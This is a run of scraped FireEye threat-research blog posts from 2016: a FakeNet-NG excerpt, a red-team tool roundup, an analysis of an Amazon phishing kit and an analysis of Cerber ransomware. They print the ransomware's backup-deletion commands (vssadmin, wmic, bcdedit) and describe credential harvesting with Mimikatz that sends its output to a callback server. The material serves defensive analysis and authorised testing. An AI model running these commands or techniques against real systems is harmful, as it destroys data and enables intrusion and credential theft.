  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FakeNet/Fig10.png"" /></p>
 <p>F<span style=""font-size: 12.0px; line-height: 1.538;"">igure 10:
    Default Listener Configuration</span></p>
 <p>Now, if the same malware sample decided to communicate on another
  port (e.g. 5555), it would still be intercepted and handled by the
  previously defined CustomListener4444.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FakeNet/Fig11.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11: Diverting to Default Listener</span></p>
 <p>The Figure 11 illustrates traffic going to the unknown port 5555
  being diverted to the previously defined custom listener on port 4444.
  It is important to note that any explicitly defined listeners will
  take precedence over the default listener. So if you have DNS or HTTP
  listeners defined on UDP port 53 and TCP port 80 respectively, then
  they would handle diverted traffic instead of the default listener as expected.</p>
 <h5>New Code Base</h5>
 <p>The new FakeNet-NG is developed completely in Python so it is easy
  to implement new services and features. It no longer uses the
  deprecated LSP (WinSock Layered Service Provider) driver implemented
  in the original FakeNet. Instead, FakeNet-NG relies on the excellent
  PyDivert\WinDivert library, which comes with a WFP (Windows Filtering
  Platform) driver that performs all of the traffic redirection.</p>
 <h5>Conclusion</h5>
 <p>This blog shares a few techniques that can be used to quickly
  perform basic dynamic malware analysis and extract good network-based
  indicators. FakeNet-NG is a powerful and highly configurable tool that
  can be used to perform more advanced tasks such as process and traffic
  filtering, aiding in automatic malware unpacking, security assessment
  of thick-client applications and many others. Stay tuned for future
  blog posts that demonstrate the full features of this tool.</p>
 <p>Try out FakeNet-NG the next time you need to perform malware
  analysis, security assessment or simply to divert network traffic and
  fake network responses. We hope you love this tool as much as we do on
  the FLARE team.</p>",http://www.fireeye.com/blog/threat-research/2016/08/fakenet-ng_next_gen.html
Red Team Tool Roundup,"<p>In many cases Red Team tools are not written because someone feels
  like writing a tool, or wakes up one morning thinking, “I want to
  write a tool today”. Red Teamers generally identify tedious tasks in
  their methodology and then create tools that automate these tasks for
  current and future assessments. As my boss likes to say, jokingly:
  laziness breeds ingenuity!</p>
 <p>At Mandiant, we’ve developed (or significantly contributed to) a
  fair number of tools and scripts to make our lives easier. In order to
  ensure the broader security community is aware of these tools and
  where to download them from, we’re going to start releasing a “tool
  roundup” blog post on a semi-regular basis. The intent of these blog
  posts is to highlight newly developed tools, or major changes to
  existing tools. We also make this a fun read by including some case
  studies to demonstrate tool use.</p>
 <p>Our <a href=""https://www.fireeye.com/content/fireeye-www/en_US/services/red-team-operations.html"">Red
  Team</a> is frequently introduced to diverse networks, technologies,
  defenses, and organizational structures. Each network presents new
  challenges that must be overcome, and with all clients, there is
  overlap with infrastructure and configuration. Existing public tools
  might not scale properly in larger environments or might not help the
  Red Team address specific phases of an <a href=""https://www2.fireeye.com/rs/848-DID-242/images/Mtrends2016.pdf"">attack
    life cycle</a>. The tools being discussed have all been revised or
  developed in some form or fashion over the last couple of months. We
  hope they make your engagements easier and bring awareness to the community.</p>
 <h5>Domain Enumeration</h5>
 <p>Tool: ADEnumerator (https://github.com/chango77747/AdEnumerator)</p>
 <p>Domain enumeration is an essential task during the reconnaissance
  phase of the attack life cycle. When you compromise a domain-joined
  system, it is fairly simple to enumerate objects from the domain using
  Active Directory Service Interfaces (<a>ADSI</a>) or the Windows “<a href=""https://support.microsoft.com/en-us/kb/556003"">net</a>”
  commands. ADSI works well from non-domain joined systems using the
  “runas” command with the “netonly” switch, as shown in Figure 1. It
  can be a hassle to craft detailed LDAP queries for ADSI to perform
  domain enumeration, so we automated this processing using raw LDAP
  queries in a tool called ADEnumerator.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Red%20Team%20Tool%20Roundup%20Pena/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Using PowerShell and ADSI for domain enumeration</span></p>
 <p>ADEnumerator is a PowerShell module designed to query Active
  Directory servers from non-domain systems. The following use cases
  apply to ADEnumerator:</p>
 <ol> <li>You harvest domain credentials from a printer, via NBNS
    spoofing, etc., and want to start performing domain enumeration.
    Note: Any domain user credential can query LDAP.</li> <li>You want
    to gather more information about an account you harvested. Group
    naming conventions often reveal where you can use those credentials
    (for example, group name {systemName}_localAdmin).</li> <li>You are
    provided with credentials to start an internal penetration test from
    a known compromise perspective, but not a domain-joined system.</li>
    <li>You want to perform Active Directory enumeration from the
    command line so you can chain commands together.</li> </ol>
 <p>Figure 2 demonstrates importing the ADEnumerator.psm1 module,
  establishing an LDAP connection to a domain controller, and executing
  various domain enumeration methods. There are plenty of additional
  methods within ADEnumerator – see the header of the script for a full
  list of methods.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Red%20Team%20Tool%20Roundup%20Pena/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. ADEnumertor.psm1 import and enumeration</span></p>
 <p>Alternatively, you can install <a href=""https://www.microsoft.com/en-us/download/details.aspx?id=7887"">Remote
    Server Administration Tools</a> on your attack platform and use
  “runas” to execute “mmc” and add the Active Directory snap-in. Then
  you can change the domain to your target domain and view the entire
  Active Directory structure in a GUI, as shown in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Red%20Team%20Tool%20Roundup%20Pena/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Active Directory snap-in running as
    different user</span></p>
 <h5>Privilege Escalation and Lateral Movement</h5>
 <p>Tools: CredNinja (https://github.com/Raikia/CredNinja) &amp; WMIOps (https://github.com/ChrisTruncer/WMIOps)</p>
 <p>Have you been in a situation where you have a list of more than 100
  credentials, but you are not sure which credentials are valid? Or,
  you’re not sure which credentials have administrative rights to a
  target system? CredNinja was created for just that (and it can do
  more!). Use cases and general functionality are as follows:</p>
 <ul> <li>Leverages SMB access (TCP port 445)</li> <li>Attempts to mount
    C$ of all provided systems, returns:</li> </ul>
 <p>        o   Logon Failure – Invalid credentials (protection against
  locking out accounts included)<br />         o   Access Denied – Not
  local admin<br />         o   File listing – Local admin!</p>
 <ul> <li>Multi-threaded – so you can scale properly in those large
  environments</li> <li>Fingerprints target operating system version and
    domain membership</li> <li>If “–users” flag is enabled, it will
    perform a directory listing of “C:\Users” (or C:\Documents and
    Settings if its XP), look at the timestamp of all the home folders,
    and print out the users that have a home folder modified timestamp
    of within 100 days (this value is customizable, but the default is
    100 days).<br />     o   Provides a quick user-hunting functionality
    to identify active users on the targeted system.</li> </ul>
 <p>CredNinja is very useful when performing privilege escalation and
  lateral movement because you can identify systems for which your
  credentials have elevated privileges, and continue dumping credentials
  on those systems. Figure 4 demonstrates the power of CredNinja by
  identifying various systems where the domain credentials have local
  administrator rights, and whether or not credentials are invalid.
  CredNinja can also be run against a single system to clean up your
  credential list by removing invalid credentials.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Red%20Team%20Tool%20Roundup%20Pena/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. CredNinja run against various systems
    using credential list</span></p>
 <p>Windows Management Instrumentation (<a>WMI</a>) is the new hotness
  in terms of offensive capabilities. WMIOps is a PowerShell script that
  uses WMI to perform a variety of actions on hosts, local or remote,
  within a Windows environment. It was designed primarily for use on
  penetration tests or Red Team engagements. Some existing tools use WMI
  for offensive tasks; WMIOps was built to combine these techniques into
  a single tool to accomplish various tasks in the attack life cycle.</p>
 <p>Figure 5 shows the Get-ProcessOwnersWMI method in WMIOps to get a
  list of users from target system Win7-Client02. User “Dick.Grayson”
  had local administrator privileges on Win7-Client02 and was authorized
  to execute arbitrary WMI commands. User “Bruce.Wayne” had running
  processes on Win7-Client02, which indicates that the user potentially
  has clear text credentials stored in Local Security Authority
  Subsystem Service (LSASS).</p>
 <p>To obtain credentials for “Bruce.Wayne”, WMIOps method
  Invoke-RemoteScriptWithOutput is used in Figure 6 to execute a remote
  PowerShell process that issues command “Invoke-Expression” to download
  and execute the “Invoke-Mimikatz” script over HTTPS. The command also
  instructs the output to be sent to web server 10.181.73.210 listening
  on HTTPS. Mimikatz output was sent to the web server, as shown in
  Figure 7.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Red%20Team%20Tool%20Roundup%20Pena/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. Get-ProcessOwnersWMI method in WMIOps
    to get a list of users with running processes</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Red%20Team%20Tool%20Roundup%20Pena/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6. Invoke-RemoteScriptWithOutput method
    to call Invoke-Mimikatz and send output to the &quot;callbacksite&quot;</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Red%20Team%20Tool%20Roundup%20Pena/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7. Mimikatz output sent from the command
    executed in Figure 4</span></p>
 <h5>Initial Vectors</h5>
 <p>Tool: EyeWitness (https://github.com/ChrisTruncer/EyeWitness)</p>
 <p>One of the most common initial vectors into a network is default
  credentials to known web administrative portals such as Jboss, Apache
  Tomcat, Jenkins, etc. EyeWitness is known to scale networks by taking
  screenshots of the web page of each web server identified in your
  reconnaissance phase. We added an “active-scan” module to EyeWitness
  that provides the following functionalities:</p>
 <ul> <li>Signature authentication – Checks if the host has a known
    default credential signature and attempts to login using default
    credentials stored in a data file.</li> <li>Check for login – Checks
    to see if the root path is a web login form, or is HTTP basic
    authentication, and attempts to authenticate to the web application
    using username and password combinations stored in a data file.</li>
    <li>Append URLs to check for logins – Appends a list of common login
    pages to the web root directory. Examples of these pages are
    “admin”, “login”, “login.php” and more. The list of pages is stored
    in a data file so that it is easily customizable; feel free to add
    more and contribute!<br />     o   If a page receives a HTTP 200
    response code, it will check to see if it’s a login form.<br />    
    o   EyeWitness will attempt to login to the form using username and
    password combinations stored in a data file.</li> </ul>
 <p>The “active-scan” Boolean flag is shown in Figure 8. Example report
  and console output is shown in Figure 9 and Figure 10. An additional
  category called “Identified Logins” is also added to the report if
  EyeWitness identified a login, but was not able to authenticate to it.
  If you want to learn more about this module, a full blog post on this
  module was written here: https://www.christophertruncer.com/eyewitness-and-active-account-enumeration/.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Red%20Team%20Tool%20Roundup%20Pena/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8. Active-scan flag in EyeWitness</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Red%20Team%20Tool%20Roundup%20Pena/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9. Successful authentication using the
    active-scan module</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Red%20Team%20Tool%20Roundup%20Pena/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10. EyeWitness report output</span></p>
 <h5>Attacker Simulation</h5>
 <p>Tool: Egress-Assess (https://github.com/ChrisTruncer/Egress-Assess)</p>
 <p>The combined capabilities of Mandiant, FireEye, and iSIGHT Partners
  brings unparalleled threat intelligence and technology to every
  engagement. Clients regularly ask us to identify threat actors
  targeting their industry specifically and to emulate their TTPs to
  assess the organization’s current detection capabilities.
  Egress-Assess is a Python tool that was created to emulate known
  attacker TTPs, such as IP addresses and Fully Qualified Domain Names
  (FQDNs) connecting to the Internet. Egress-Assess is publicly
  available; however, Mandiant maintains a proprietary version of
  Egress-Assess that contains known network-based indicators (NBIs) that
  replicate real threat groups.</p>
 <p>Egress-Assess modifies the host value in the HTTP(s) header request
  to be a known-bad IP address or FQDN, and generates web requests to
  known-bad URIs. Furthermore, the tool can generate fake PII, PHI, or
  PCI data to emulate data theft. We use Egress-Assess to assess our
  client’s detection capabilities by emulating real threat group
  indicators and/or data theft. A list of supported threat actor groups
  available in the public version of Egress-Assess is shown in Figure
  11. If you want to learn more about this Egress-Assess, a full blog
  post on this module was written here: https://www.christophertruncer.com/egress-assess-testing-egress-data-detection-capabilities/.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Red%20Team%20Tool%20Roundup%20Pena/Fig11.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11. List of threat actors available in Egress-Assess</span></p>
 <h5>Conclusion</h5>
 <p>These are just a handful of tools and practical examples of using
  those tools for Red Team operations. We encourage you to play with
  these tools and start using them on your assessments or in your labs.</p>
 <p>We want to reemphasize that each tool was created or modified as the
  need was identified. It can be very exciting to identify a need and
  develop tools and techniques to automate a task or accomplish an
  objective. Some tools introduce new techniques to accomplish a goal,
  while other tools simply automate existing tools and techniques to
  scale better. Whatever your motive, introducing new tools and
  techniques is an excellent way to provide awareness in our industry
  and generate higher quality security.<br /> </p>",http://www.fireeye.com/blog/threat-research/2016/07/red_team_tool_roundup.html
Amazon Same Day Credential Shipping,"<p>FireEye has identified a campaign involving phishing websites that
  appear as legitimate Amazon sites. Amazon is the largest online
  retailer and threat actors frequently target its customers. In this
  attack, a person browsing the internet would be directed to authentic
  looking – yet fake – Amazon webpages that request a variety of
  information, including Amazon credentials, home address and payment
  card data. Any information entered into the phishing websites could be
  sent to the attackers and potentially used to make fraudulent charges
  and commit other crimes.</p>
 <p>FireEye detected this phishing campaign through our email MPS
  platform and has seen attacks primarily targeting Amazon customers in
  the U.S., Canada and Europe. FireEye has made Amazon.com aware of this
  phishing campaign. In addition to aggressively investigating all <a href=""https://www.amazon.com/gp/help/customer/display.html?nodeId=201127830"">suspicious
    email reports</a>, Amazon.com provides resources for customers to <a href=""https://www.amazon.com/gp/help/customer/display.html?nodeId=15835501"">identify
    whether an email is from Amazon.com</a> and to <a href=""https://www.amazon.com/gp/help/customer/display.html?nodeId=201127790"">protect
    their systems</a>.</p>
 <p>While there have been numerous reports on Amazon phishing attacks in
  the past, this campaign is particularly interesting for security
  analysts because of the evasion techniques being used by the
  attackers. Though various instances of this phishing practice have
  been previously used, we’ve been following this particular campaign
  variant since June 21, 2016. Some of the evasion techniques used in
  this campaign include:</p>
 <ul> <li>The phishing page sitting in a legitimate domain, leveraging
    the good reputation of the compromised (non-Amazon) site.</li>
    <li>The campaign being browser-aware in terms of the URL it displays
    in the browser.</li> <li>The use of numerical HTML encoding of
    Unicode Characters.</li> <li>IP-based evasion, URL path
    randomization and redirection to an endpoint host to ensure the
    final phishing URL is always unique.</li> </ul>
 <h5>Phishing Template Presentation and Techniques</h5>
 <p>After clicking the initial URL, the user is redirected to the
  phishing template page hosted on another compromised site. The
  campaign is browser-aware in terms of the URL it displays in the
  browser.  Hexadecimal encoded domains are displayed when Firefox or
  Safari are used while clear text is displayed in Chrome. An example
  rendering is shown in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Amazon%20Same%20Day%20Credential%20Gurav%20Dalal/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Initial Phishing Page</span></p>
 <p>To the user, the page appears to be a legitimate Amazon login page.
  Behind the scenes, however, numerical HTML encoding of Unicode
  characters are prevalent throughout the page serving up the fake
  Amazon login page, as shown in Figure 2. This tactic helps to evade
  text-based detections.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Amazon%20Same%20Day%20Credential%20Gurav%20Dalal/Fig2.png"" />
  <span class=""type-XS"">Figure 2. Numerical HTML encoding of Unicode
    Characters in the Amazon phishing page.</span></p>
 <h5>Redirection Analysis and Evasion Techniques</h5>
 <p>The malicious actor behind this phishing campaign regularly updated
  connect.php on the initial compromised host. The purpose of the
  initial host is to redirect users to infected machines hosting
  phishing sites where the phishing template page has been uploaded. As
  these endpoint phishing sites get taken down, a new one is established
  and the redirection page is modified to point to the new phishing page location.</p>
 <p>Figure 3 shows an example of a complete redirection chain.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Amazon%20Same%20Day%20Credential%20Gurav%20Dalal/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Redirection Chain example</span></p>
 <p>After the initial redirection to the second URL in the chain, the
  first thing the server does is include an anti-detection module. This
  anti-detection module blocks certain IPs, including search engines
  such as Google, anti-phishing tools such as Netcraft, and other
  network service providers. This makes the website not detectable by
  bots by returning a 404 Not Found page instead of continuing
  redirection to the phishing template. An example of the extracted IP
  based anti-detection code is shown in Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Amazon%20Same%20Day%20Credential%20Gurav%20Dalal/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. IP based anti-detection code</span></p>
 <p>The next action the server takes if their IP is not banned is to
  record a log of the victims who visit the page. Code extracted shows
  that the logging includes the visitor’s IP, user-agent, operating
  system, browser, hostname and referer information, as shown in Figure 5.  </p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Amazon%20Same%20Day%20Credential%20Gurav%20Dalal/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. Visitor tracking code</span></p>
 <p>Figure 6 shows the debug log file left by the template writer.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Amazon%20Same%20Day%20Credential%20Gurav%20Dalal/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6. Debug log file</span></p>
 <p>After logging the user information, code is executed to create a
  random md5 hash path name for the phishing page that will ultimately
  be served to the end user. After all resources are copied to the
  random path, the server redirects the visitor to this path
  (redirections 3 through 5 in Figure 3), thus rendering the actual
  phishing page in the user’s browser. The code responsible for
  generating the random path is shown in Figure 7.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Amazon%20Same%20Day%20Credential%20Gurav%20Dalal/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7. Path randomization code</span></p>
 <h5>Credential Harvesting and Final Redirection</h5>
 <p>At this point, the initial phishing template page shown in Figure 1
  is rendered in the user’s browser.  After entering their initial login
  credentials, the user is taken through a series of two more pages
  shown in Figure 8 and Figure 9. This is to harvest address and billing information.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Amazon%20Same%20Day%20Credential%20Gurav%20Dalal/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8. Fake Address Verification Page</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Amazon%20Same%20Day%20Credential%20Gurav%20Dalal/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9. Fake Billing Information Page</span></p>
 <p>After the victim has entered all the requested information, the
  server sends an email containing the information to the attacker’s
  email address and redirects the user to the real Amazon webpage.</p>
 <p>The code shown in Figure 10 is the code that builds the email
  message sent to the phisher.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Amazon%20Same%20Day%20Credential%20Gurav%20Dalal/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10. Email building code</span></p>
 <p>The victim’s information is contained in the $message variable that
  is built from the user’s responses to the pages shown in Figure 8 and
  Figure 9.  Figure 11 shows the code that builds the message contents,
  which contains the harvested user’s information.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Amazon%20Same%20Day%20Credential%20Gurav%20Dalal/Fig11.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11. Message building code</span></p>
 <p>After the harvested credentials are emailed to the attackers, the
  user is sent a final redirection to the legitimate Amazon page. The
  code behind this redirection is shown in Figure 12.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Amazon%20Same%20Day%20Credential%20Gurav%20Dalal/Fig12.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 12. Final redirection</span></p>
 <h5>Conclusion</h5>
 <p>Detecting these types of threats can be tricky, particularly when
  the attacker is leveraging some interesting evasion techniques.
  Oftentimes users are redirected to phishing pages after clicking on a
  malicious link. FireEye recommends that users exercise caution when
  clicking on links from untrusted parties, avoid opening emails from
  unknown senders, and be wary of emails from anyone requesting
  personally identifiable information. Additionally, and most
  importantly, users should only log into Amazon by visiting the website directly.</p>",http://www.fireeye.com/blog/threat-research/2016/07/amazon-credential-shipping.html
Cerber: Analyzing a Ransomware Attack Methodology To Enable Protection,"<p>Ransomware is a common method of cyber extortion for financial gain
  that typically involves users being unable to interact with their
  files, applications or systems until a ransom is paid. Accessibility
  of cryptocurrency such as Bitcoin has directly contributed to this
  ransomware model. Based on data from FireEye Dynamic Threat
  Intelligence (DTI), ransomware activities have been <a href=""https://www.fireeye.com/blog/threat-research/2016/05/ransomware_activity.html"">rising
    fairly steadily</a> since mid-2015.</p>
 <p>On June 10, 2016, FireEye’s HX detected a Cerber ransomware campaign
  involving the distribution of emails with a malicious Microsoft Word
  document attached. If a recipient were to open the document a
  malicious macro would contact an attacker-controlled website to
  download and install the Cerber family of ransomware.</p>
 <p>Exploit Guard, a major new feature of <a href=""https://www.fireeye.com/products/hx-endpoint-security-products.html"">FireEye
    Endpoint Security (HX)</a>, detected the threat and alerted HX
  customers on infections in the field so that organizations could
  inhibit the deployment of Cerber ransomware. After investigating
  further, the FireEye research team worked with security agency
  CERT-Netherlands, as well as web hosting providers who unknowingly
  hosted the Cerber installer, and were able to shut down that instance
  of the Cerber command and control (C2) within hours of detecting the
  activity. With the attacker-controlled servers offline, macros and
  other malicious payloads configured to download are incapable of
  infecting users with ransomware.</p>
 <p>FireEye hasn’t seen any additional infections from this attacker
  since shutting down the C2 server, although the attacker could
  configure one or more additional C2 servers and resume the campaign at
  any time. This particular campaign was observed on six unique
  endpoints from three different FireEye endpoint security customers. HX
  has proven effective at detecting and inhibiting the success of Cerber malware.</p>
 <h5>Attack Process</h5>
 <p>The Cerber ransomware attack cycle we observed can be broadly broken
  down into eight steps:</p>
 <ol> <li>Target receives and opens a Word document.</li> <li>Macro in
    document is invoked to run PowerShell in hidden mode.</li>
    <li>Control is passed to PowerShell, which connects to a malicious
    site to download the ransomware.</li> <li>On successful connection,
    the ransomware is written to the disk of the victim.</li>
    <li>PowerShell executes the ransomware.</li> <li>The malware
    configures multiple concurrent persistence mechanisms by creating
    command processor, screensaver, startup.run and runonce registry
  entries.</li> <li>The executable uses native Windows utilities such as
    WMIC and/or VSSAdmin to delete backups and shadow copies.</li>
    <li>Files are encrypted and messages are presented to the user
    requesting payment.</li> </ol>
 <p>Rather than waiting for the payload to be downloaded or started
  around stage four or five of the aforementioned attack cycle, Exploit
  Guard provides coverage for most steps of the attack cycle – beginning
  in this case at the second step.</p>
 <p>The most common way to deliver ransomware is via Word documents with
  embedded macros or a Microsoft Office exploit. FireEye Exploit Guard
  detects both of these attacks at the initial stage of the attack cycle.</p>
 <h5>PowerShell Abuse</h5>
 <p>When the victim opens the attached Word document, the malicious
  macro writes a small piece of VBScript into memory and executes it.
  This VBScript executes PowerShell to connect to an attacker-controlled
  server and download the ransomware (profilest.exe), as seen in Figure
    1.<img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Launch sequence of Cerber – the macro
    is responsible for invoking PowerShell and PowerShell downloads and
    runs the malware</span></p>
 <p>It has been increasingly common for threat actors to use malicious
  macros to infect users because the majority of organizations permit
  macros to run from Internet-sourced office documents.</p>
 <p>In this case we observed the macrocode calling PowerShell to bypass
  execution policies – and run in hidden as well as encrypted mode –
  with the intention that PowerShell would download the ransomware and
  execute it without the knowledge of the victim.</p>
 <p>Further investigation of the link and executable showed that every
  few seconds the malware hash changed with a more current compilation
  timestamp and different appended data bytes – a technique often used
  to evade hash-based detection.</p>
 <h4>Cerber in Action</h4>
 <h5>Initial payload behavior</h5>
 <p>Upon execution, the Cerber malware will check to see where it is
  being launched from. Unless it is being launched from a specific
  location (%APPDATA%\&amp;#60GUID&amp;#62), it creates a copy of itself
  in the victim's %APPDATA% folder under a filename chosen randomly and
  obtained from the %WINDIR%\system32 folder.</p>
 <p>If the malware is launched from the specific aforementioned folder
  and after eliminating any blacklisted filenames from an internal list,
  then the malware creates a renamed copy of itself to
  “%APPDATA%\&amp;#60GUID&amp;#62” using a pseudo-randomly selected name
  from the “system32” directory. The malware executes the malware from
  the new location and then cleans up after itself.</p>
 <h5>Shadow deletion</h5>
 <p>As with many other ransomware families, Cerber will bypass UAC
  checks, delete any volume shadow copies and disable safe boot options.
  Cerber accomplished this by launching the following processes using
  respective arguments:</p>
 <p>Vssadmin.exe &quot;delete shadows /all /quiet&quot;</p>
 <p>WMIC.exe &quot;shadowcopy delete&quot;</p>
 <p>Bcdedit.exe &quot;/set {default} recoveryenabled no&quot;</p>
 <p>Bcdedit.exe &quot;/set {default} bootstatuspolicy ignoreallfailures</p>
 <h5>Coercion</h5>
 <p>People may wonder why victims pay the ransom to the threat actors.
  In some cases it is as simple as needing to get files back, but in
  other instances a victim may feel coerced or even intimidated. We
  noticed these tactics being used in this campaign, where the victim is
  shown the message in Figure 2 upon being infected with Cerber.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. A message to the victim after encryption</span></p>
 <p>The ransomware authors attempt to incentivize the victim into paying
  quickly by providing a 50 percent discount if the ransom is paid
  within a certain timeframe, as seen in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig3.jpeg"" /></p>
 <p> </p>
 <p> </p>
 <p>
  <span class=""type-XS"">Figure 3. Ransom offered to victim, which is
    discounted for five days</span></p>
 <h5>Multilingual Support</h5>
 <p>As seen in Figure 4, the Cerber ransomware presented its message and
  instructions in 12 different languages, indicating this attack was on
  a global scale.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20Analyzing%20a%20Ransomware%20Ankit/fig4.jpeg"" /></p>
 <p>
  <span class=""type-XS"">Figure 4.   Interface provided to the victim to
    pay ransom supports 12 languages</span></p>
 <h5>Encryption</h5>
 <p>Cerber targets 294 different file extensions for encryption,
  including .doc (typically Microsoft Word documents), .ppt (generally
  Microsoft PowerPoint slideshows), .jpg and other images. It also
  targets financial file formats such as. ibank (used with certain
  personal finance management software) and .wallet (used for Bitcoin).</p>
 <h5>Selective Targeting</h5>
 <p>Selective targeting was used in this campaign. The attackers were
  observed checking the country code of a host machine’s public IP
  address against a list of blacklisted countries in the JSON
  configuration, utilizing online services such as ipinfo.io to verify
  the information. Blacklisted (protected) countries include:
    <i>Armenia, Azerbaijan, Belarus, Georgia, Kyrgyzstan, Kazakhstan,
    Moldova, Russia, Turkmenistan, Tajikistan, Ukraine, and Uzbekistan</i>.</p>
 <p>The attack also checked a system's keyboard layout to further ensure
  it avoided infecting machines in the attackers geography:
    <i>1049—Russian, ¨ 1058—Ukrainian, 1059—Belarusian, 1064—Tajik,
    1067—Armenian, 1068—Azeri, (Latin), 1079—Georgian, 1087—Kazakh,
    1088—Kyrgyz (Cyrillic), 1090—Turkmen, 1091—Uzbek (Latin),
    2072—Romanian (Moldova), 2073—Russian (Moldova), 2092—Azeri
    (Cyrillic), 2115—Uzbek (Cyrillic).</i></p>
 <p>Selective targeting has historically been used to keep malware from
  infecting endpoints within the author’s geographical region, thus
  protecting them from the wrath of local authorities. The actor also
  controls their exposure using this technique. In this case, there is
  reason to suspect the attackers are based in Russia or the surrounding region.</p>
 <h5>Anti VM Checks</h5>
 <p>The malware searches for a series of hooked modules, specific
  filenames and paths, and known sandbox volume serial numbers,
  including: sbiedll.dll, dir_watch.dll, api_log.dll, dbghelp.dll,
  Frz_State, C:\popupkiller.exe, C:\stimulator.exe,
  C:\TOOLS\execute.exe, \sand-box\, \cwsandbox\, \sandbox\, 0CD1A40,
  6CBBC508, 774E1682, 837F873E, 8B6F64BC.</p>
 <p>Aside from the aforementioned checks and blacklisting, there is also
  a wait option built in where the payload will delay execution on an
  infected machine before it launches an encryption routine. This
  technique was likely implemented to further avoid detection within
  sandbox environments.</p>
 <h5>Persistence</h5>
 <p>Once executed, Cerber deploys the following persistence techniques
  to make sure a system remains infected:</p>
 <ul> <li>A registry key is added to launch the malware instead of the
    screensaver when the system becomes idle.</li> <li>The
    “CommandProcessor” Autorun keyvalue is changed to point to the
    Cerber payload so that the malware will be launched each time the
    Windows terminal, “cmd.exe”, is launched.</li> <li>A shortcut (.lnk)
    file is added to the startup folder. This file references the
    ransomware and Windows will execute the file immediately after the
    infected user logs in.</li> <li>Common persistence methods such as
    run and runonce key are also used.</li> </ul>
 <h5>A Solid Defense<br /> </h5>
 <p>Mitigating ransomware malware has become a high priority for
  affected organizations because passive security technologies such as
  signature-based containment have proven ineffective.<br /> <br />
  Malware authors have demonstrated an ability to outpace most endpoint
  controls by compiling multiple variations of their malware with minor
  binary differences. By using alternative packers and compilers,
  authors are increasing the level of effort for researchers and
  reverse-engineers. Unfortunately, those efforts don’t scale.<br />
  <br /> Disabling support for macros in documents from the Internet and
  increasing user awareness are two ways to reduce the likelihood of
  infection. If you can, consider blocking connections to websites you
  haven’t explicitly whitelisted. However, these controls may not be
  sufficient to prevent all infections or they may not be possible based
  on your organization.<br /> <br /> <a href=""https://www.fireeye.com/content/fireeye-www/en_US/products/hx-endpoint-security-products/hx-endpoint-security-datasheet.html"" target=""_blank"">FireEye Endpoint Security</a> with Exploit Guard
  helps to detect exploits and techniques used by ransomware attacks
  (and other threat activity) during execution and provides analysts
  with greater visibility. This helps your security team conduct more
  detailed investigations of broader categories of threats. This
